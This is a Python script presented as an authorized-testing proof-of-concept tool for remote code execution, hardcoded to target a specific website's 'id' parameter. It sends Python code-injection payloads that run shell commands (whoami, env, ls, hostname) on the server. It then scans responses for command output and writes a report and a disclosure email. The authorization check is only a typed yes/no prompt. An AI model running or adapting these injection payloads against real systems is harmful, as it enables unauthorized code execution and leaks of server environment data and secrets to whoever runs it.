import requests
import time
import json
import sys
from urllib.parse import quote_plus
import hashlib
import re

class RCEProofOfConcept:
    def __init__(self):
        self.TARGET_URL = "https://lirat.store/endpoint"  # Change to your target
        self.PARAM = "id"  # Vulnerable parameter
        self.TEST_PREFIX = "XRCE_TEST_"
        self.TIMESTAMP = str(int(time.time()))
        self.SESSION_ID = hashlib.md5(self.TIMESTAMP.encode()).hexdigest()[:8]
        self.report = {
            "metadata": {
                "title": "Remote Code Execution (RCE) Proof of Concept Report",
                "target": self.TARGET_URL,
                "parameter": self.PARAM,
                "tester": "Security Researcher",
                "date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "session_id": self.SESSION_ID,
                "tool_version": "1.0"
            },
            "executive_summary": "",
            "methodology": "",
            "findings": [],
            "evidence": [],
            "risk_assessment": {},
            "recommendations": [],
            "conclusion": ""
        }
    
    def print_banner(self):
        """Display tool banner"""
        banner = """
╔══════════════════════════════════════════════════════════╗
║         RCE Proof of Concept - Security Test             ║
║         For Authorized Testing Only                      ║
╚══════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def get_authorization(self):
        """Verify testing authorization"""
        print("\n" + "="*70)
        print("LEGAL DISCLAIMER".center(70))
        print("="*70)
        print("\nThis tool is for authorized security testing only.")
        print("Unauthorized use against systems you do not own or have")
        print("explicit permission to test is ILLEGAL and UNETHICAL.")
        print("\nYou are solely responsible for your actions.")
        print("="*70)
        
        response = input("\nDo you have written authorization to test this system? (yes/no): ").strip().lower()
        
        if response not in ['yes', 'y']:
            print("\n[!] Testing aborted. No authorization provided.")
            sys.exit(0)
        
        self.report["metadata"]["authorization_confirmed"] = True
        print("\n[+] Authorization confirmed. Starting security assessment...")
    
    def generate_payloads(self):
        """Generate safe RCE test payloads"""
        return [
            {
                "id": 1,
                "name": "Basic Command Injection",
                "severity": "Critical",
                "payload": f"__import__('os').popen('echo {self.TEST_PREFIX}{self.SESSION_ID}').read()",
                "expected": f"Detection of '{self.TEST_PREFIX}{self.SESSION_ID}' in response",
                "safe": True
            },
            {
                "id": 2,
                "name": "System Information Disclosure",
                "severity": "High",
                "payload": "__import__('os').popen('whoami').read()",
                "expected": "Current user context in response",
                "safe": True
            },
            {
                "id": 3,
                "name": "Environment Variables",
                "severity": "Medium",
                "payload": "__import__('os').popen('env | head -5').read()",
                "expected": "Environment variables in response",
                "safe": True
            },
            {
                "id": 4,
                "name": "Directory Listing",
                "severity": "Medium",
                "payload": "__import__('os').popen('ls -la | head -10').read()",
                "expected": "Directory listing in response",
                "safe": True
            },
            {
                "id": 5,
                "name": "Network Configuration",
                "severity": "Low",
                "payload": "__import__('os').popen('hostname').read()",
                "expected": "Hostname in response",
                "safe": True
            }
        ]
    
    def execute_test(self, test_case):
        """Execute a single test case"""
        try:
            print(f"\n[→] Test #{test_case['id']}: {test_case['name']}")
            print(f"    Severity: {test_case['severity']}")
            print(f"    Payload: {test_case['payload'][:80]}...")
            
            # Prepare request
            params = {self.PARAM: test_case['payload']}
            headers = {
                'User-Agent': f'Security-Test-POC/{self.SESSION_ID}',
                'X-Test-ID': str(test_case['id']),
                'Accept': '*/*'
            }
            
            start_time = time.time()
            response = requests.get(
                self.TARGET_URL,
                params=params,
                headers=headers,
                timeout=15,
                verify=False,  # For testing only
                allow_redirects=False
            )
            elapsed_time = time.time() - start_time
            
            # Analyze response
            test_result = {
                "test_id": test_case['id'],
                "test_name": test_case['name'],
                "severity": test_case['severity'],
                "payload_used": test_case['payload'],
                "request_url": response.url,
                "status_code": response.status_code,
                "response_time": f"{elapsed_time:.3f}s",
                "response_size": len(response.text),
                "headers": dict(response.headers),
                "vulnerable": False,
                "evidence_found": None,
                "risk_level": "None"
            }
            
            # Check for RCE indicators
            indicators = self.check_rce_indicators(response, test_case)
            
            if indicators['vulnerable']:
                test_result['vulnerable'] = True
                test_result['evidence_found'] = indicators['evidence']
                test_result['risk_level'] = test_case['severity']
                
                print(f"    [!!!] VULNERABLE - {test_case['severity']} risk")
                print(f"    Evidence: {indicators['evidence']}")
                
                # Add to findings
                self.add_finding(test_case, indicators)
            else:
                print(f"    [-] Not vulnerable")
            
            # Store evidence
            self.store_evidence(test_case, response, test_result)
            
            # Brief delay between tests
            time.sleep(1.5)
            
            return test_result
            
        except requests.exceptions.Timeout:
            print(f"    [!] Timeout occurred")
            return {"test_id": test_case['id'], "error": "Request timeout"}
        except Exception as e:
            print(f"    [!] Error: {str(e)}")
            return {"test_id": test_case['id'], "error": str(e)}
    
    def check_rce_indicators(self, response, test_case):
        """Check response for RCE indicators"""
        indicators = {
            "vulnerable": False,
            "evidence": []
        }
        
        text = response.text
        
        # Check for our test marker
        if self.TEST_PREFIX + self.SESSION_ID in text:
            indicators["vulnerable"] = True
            indicators["evidence"].append(f"Test marker '{self.TEST_PREFIX}{self.SESSION_ID}' found in response")
        
        # Check for command output patterns
        cmd_output_patterns = [
            r'root@', r'admin@', r'www-data@',  # User prompts
            r'\/home\/', r'\/var\/www\/', r'\/tmp\/',  # Common paths
            r'total\s+\d+',  # ls command output
            r'PWD=|PATH=|USER=',  # Environment variables
            r'uid=\d+\(\w+\)\s+gid=\d+\(\w+\)',  # id command output
        ]
        
        for pattern in cmd_output_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                indicators["vulnerable"] = True
                indicators["evidence"].append(f"Command output pattern detected: {pattern}")
                break
        
        # Check for error messages that indicate command execution
        error_indicators = [
            "command not found",
            "permission denied",
            "no such file or directory",
            "syntax error",
            "cannot execute"
        ]
        
        for error in error_indicators:
            if error in text.lower():
                indicators["vulnerable"] = True
                indicators["evidence"].append(f"Command execution error: '{error}'")
                break
        
        # Join evidence list
        if indicators["evidence"]:
            indicators["evidence"] = "; ".join(indicators["evidence"])
        else:
            indicators["evidence"] = "No direct evidence"
        
        return indicators
    
    def add_finding(self, test_case, indicators):
        """Add a finding to the report"""
        finding = {
            "id": len(self.report["findings"]) + 1,
            "title": f"RCE Vulnerability via {self.PARAM} parameter",
            "description": f"The application executes Python code passed through the {self.PARAM} parameter.",
            "severity": test_case["severity"],
            "cvss_score": self.calculate_cvss_score(test_case["severity"]),
            "location": f"{self.TARGET_URL}?{self.PARAM}=[malicious_code]",
            "proof": indicators["evidence"],
            "impact": "Full server compromise, data theft, system takeover",
            "reproduction": f"Send GET request with: {self.PARAM}={test_case['payload']}",
            "cwe": "CWE-94: Improper Control of Generation of Code ('Code Injection')"
        }
        
        self.report["findings"].append(finding)
    
    def calculate_cvss_score(self, severity):
        """Calculate approximate CVSS score based on severity"""
        scores = {
            "Critical": "9.0-10.0",
            "High": "7.0-8.9",
            "Medium": "4.0-6.9",
            "Low": "0.1-3.9"
        }
        return scores.get(severity, "N/A")
    
    def store_evidence(self, test_case, response, test_result):
        """Store evidence from the test"""
        evidence = {
            "test_id": test_case["id"],
            "timestamp": time.strftime("%H:%M:%S"),
            "request": {
                "url": response.url,
                "method": "GET",
                "parameter": self.PARAM,
                "payload": test_case["payload"][:200] + "..." if len(test_case["payload"]) > 200 else test_case["payload"]
            },
            "response": {
                "status": response.status_code,
                "size": len(response.text),
                "time": test_result["response_time"],
                "headers": dict(response.headers),
                "body_preview": response.text[:500] + "..." if len(response.text) > 500 else response.text
            },
            "result": "VULNERABLE" if test_result.get("vulnerable") else "SAFE"
        }
        
        self.report["evidence"].append(evidence)
    
    def generate_executive_summary(self, results):
        """Generate executive summary"""
        vulnerable_tests = [r for r in results if isinstance(r, dict) and r.get("vulnerable")]
        
        if vulnerable_tests:
            self.report["executive_summary"] = f"""
CRITICAL SECURITY VULNERABILITY DETECTED

A Remote Code Execution (RCE) vulnerability was discovered in the target application.
Attackers can execute arbitrary system commands on the server through the '{self.PARAM}'
parameter. This vulnerability allows complete compromise of the affected system.

• Total Tests: {len(results)}
• Vulnerable Tests: {len(vulnerable_tests)}
• Highest Severity: Critical
• Impact: Full system compromise
• Urgency: IMMEDIATE ACTION REQUIRED
            """
        else:
            self.report["executive_summary"] = f"""
SECURITY ASSESSMENT COMPLETED

No RCE vulnerabilities were detected during this assessment. However, this does not
guarantee the absence of other vulnerabilities or more sophisticated RCE vectors.

• Total Tests: {len(results)}
• Vulnerable Tests: 0
• Status: No RCE detected
• Recommendation: Continue periodic security testing
            """
    
    def generate_risk_assessment(self, vulnerable_count):
        """Generate risk assessment section"""
        if vulnerable_count > 0:
            self.report["risk_assessment"] = {
                "overall_risk": "CRITICAL",
                "impact": "HIGH",
                "likelihood": "HIGH",
                "business_impact": [
                    "Complete system compromise",
                    "Data theft and exfiltration",
                    "Service disruption",
                    "Reputation damage",
                    "Regulatory penalties"
                ],
                "affected_components": [
                    "Web application server",
                    "Underlying operating system",
                    "Database systems",
                    "Network resources"
                ]
            }
        else:
            self.report["risk_assessment"] = {
                "overall_risk": "LOW",
                "impact": "NONE DETECTED",
                "likelihood": "NONE DETECTED",
                "business_impact": ["None identified"],
                "affected_components": ["None identified"]
            }
    
    def generate_recommendations(self):
        """Generate remediation recommendations"""
        self.report["recommendations"] = [
            {
                "priority": "IMMEDIATE (0-24 hours)",
                "actions": [
                    "Isolate the affected system from production network",
                    "Disable the vulnerable endpoint immediately",
                    "Implement Web Application Firewall (WAF) rules to block RCE attempts",
                    "Review access logs for signs of exploitation"
                ]
            },
            {
                "priority": "SHORT TERM (1-7 days)",
                "actions": [
                    "Audit all user inputs and implement proper validation",
                    "Replace eval() and exec() with safe alternatives",
                    "Implement input sanitization and output encoding",
                    "Apply the principle of least privilege to application accounts"
                ]
            },
            {
                "priority": "LONG TERM (1-4 weeks)",
                "actions": [
                    "Conduct comprehensive security code review",
                    "Implement Content Security Policy (CSP)",
                    "Deploy Runtime Application Self-Protection (RASP)",
                    "Establish continuous security testing pipeline",
                    "Provide secure coding training for developers"
                ]
            }
        ]
    
    def save_report(self):
        """Save report to file"""
        filename = f"RCE_POC_Report_{self.SESSION_ID}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(self.report, f, indent=2, ensure_ascii=False)
        
        # Also create a text summary
        text_filename = f"RCE_POC_Summary_{self.SESSION_ID}.txt"
        with open(text_filename, 'w', encoding='utf-8') as f:
            f.write(self.generate_text_summary())
        
        return filename, text_filename
    
    def generate_text_summary(self):
        """Generate text summary for quick reading"""
        summary = f"""
{'='*70}
RCE PROOF OF CONCEPT - TEST REPORT
{'='*70}

Target: {self.TARGET_URL}
Test Date: {self.report['metadata']['date']}
Session ID: {self.SESSION_ID}

EXECUTIVE SUMMARY
{'-'*70}
{self.report['executive_summary']}

{'='*70}
FINDINGS
{'='*70}
"""
        
        for finding in self.report['findings']:
            summary += f"\n[{finding['severity']}] {finding['title']}\n"
            summary += f"Location: {finding['location']}\n"
            summary += f"Proof: {finding['proof']}\n"
            summary += f"Impact: {finding['impact']}\n"
            summary += "-"*50 + "\n"
        
        if not self.report['findings']:
            summary += "\nNo critical vulnerabilities found.\n"
        
        summary += f"""
{'='*70}
RECOMMENDATIONS
{'='*70}
"""
        
        for rec in self.report['recommendations']:
            summary += f"\n{rec['priority']}:\n"
            for action in rec['actions']:
                summary += f"  • {action}\n"
        
        summary += f"""
{'='*70}
CONCLUSION
{'='*70}
This proof of concept demonstrates {'a CRITICAL RCE vulnerability' if self.report['findings'] else 'no RCE vulnerabilities'} 
in the target application. {'IMMEDIATE remediation is required' if self.report['findings'] else 'Regular security testing is recommended'}.

For detailed evidence and request/response logs, refer to the JSON report.

{'='*70}
END OF REPORT
{'='*70}
        """
        
        return summary
    
    def print_report_summary(self):
        """Print summary to console"""
        print("\n" + "="*70)
        print("TEST COMPLETED".center(70))
        print("="*70)
        
        vulnerable_count = len(self.report["findings"])
        
        if vulnerable_count > 0:
            print(f"\n[CRITICAL] {vulnerable_count} RCE VULNERABILITIES DETECTED!")
            print("\nKey Findings:")
            for finding in self.report["findings"]:
                print(f"  • {finding['title']} ({finding['severity']})")
            
            print("\n" + "!"*70)
            print("IMMEDIATE ACTION REQUIRED!")
            print("The system is vulnerable to complete takeover.")
            print("!"*70)
        else:
            print("\n[✓] No RCE vulnerabilities detected")
            print("\nNote: This test covers basic RCE vectors only.")
            print("Comprehensive penetration testing is recommended.")
    
    def run(self):
        """Main execution method"""
        self.print_banner()
        self.get_authorization()
        
        print(f"\n[*] Starting RCE Security Assessment")
        print(f"[*] Target: {self.TARGET_URL}")
        print(f"[*] Parameter: {self.PARAM}")
        print(f"[*] Session ID: {self.SESSION_ID}")
        print(f"[*] Time: {time.strftime('%H:%M:%S')}")
        
        # Generate and execute test cases
        test_cases = self.generate_payloads()
        results = []
        
        print(f"\n[*] Executing {len(test_cases)} test cases...")
        print("-"*70)
        
        for test_case in test_cases:
            result = self.execute_test(test_case)
            results.append(result)
        
        # Generate report sections
        vulnerable_results = [r for r in results if isinstance(r, dict) and r.get("vulnerable")]
        
        self.generate_executive_summary(results)
        self.generate_risk_assessment(len(vulnerable_results))
        self.generate_recommendations()
        
        # Set conclusion
        if vulnerable_results:
            self.report["conclusion"] = "CRITICAL RCE vulnerability confirmed. Immediate remediation required."
        else:
            self.report["conclusion"] = "No RCE vulnerabilities detected in this assessment."
        
        # Save reports
        json_report, text_report = self.save_report()
        
        # Display summary
        self.print_report_summary()
        
        print(f"\n[+] Reports generated:")
        print(f"    • Detailed JSON: {json_report}")
        print(f"    • Text Summary: {text_report}")
        
        # Email template for reporting
        if vulnerable_results:
            print(f"\n{'='*70}")
            print("EMAIL TEMPLATE FOR REPORTING")
            print("="*70)
            print(f"""
Subject: [URGENT] Critical Security Vulnerability - RCE in {self.TARGET_URL}

Dear Security Team,

I have identified a critical Remote Code Execution (RCE) vulnerability in your application.

VULNERABILITY DETAILS:
• Type: Remote Code Execution (RCE)
• Severity: Critical
• Location: {self.TARGET_URL}
• Parameter: {self.PARAM}
• Impact: Complete system compromise
• Evidence: Attached in the report

IMMEDIATE ACTIONS REQUIRED:
1. Isolate the affected system
2. Review the attached security report
3. Implement emergency patches

I have attached the detailed security report containing:
• Proof of concept evidence
• Request/response logs
• Risk assessment
• Remediation recommendations

This vulnerability allows attackers to execute arbitrary commands on your server. 
Please address this immediately to prevent potential data breaches.

Please acknowledge receipt of this report.

Best regards,
Security Researcher

Attachments: {json_report}, {text_report}
            """)
        
        print(f"\n{'='*70}")
        print("Assessment completed successfully.")
        print("="*70)

# Main execution
if __name__ == "__main__":
    try:
        poc = RCEProofOfConcept()
        poc.run()
    except KeyboardInterrupt:
        print("\n\n[!] Assessment interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {str(e)}")
        sys.exit(1)